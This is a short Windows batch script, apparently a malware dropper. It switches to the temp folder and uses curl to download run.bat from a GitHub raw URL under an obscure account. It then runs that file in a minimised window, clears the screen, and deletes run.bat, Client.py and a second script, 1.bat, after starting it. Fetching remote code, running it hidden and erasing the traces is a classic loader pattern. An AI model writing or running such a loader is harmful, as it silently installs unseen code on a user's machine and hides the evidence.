cd %temp%
curl -o run.bat https://raw.githubusercontent.com/oogabooga245/-/main/run.bat
del Client.py
START /MIN CMD.EXE /C run.bat
cls
timeout 30 >nul
del run.bat
start 1.bat
timeout 1 >nul
del 1.bat
exit
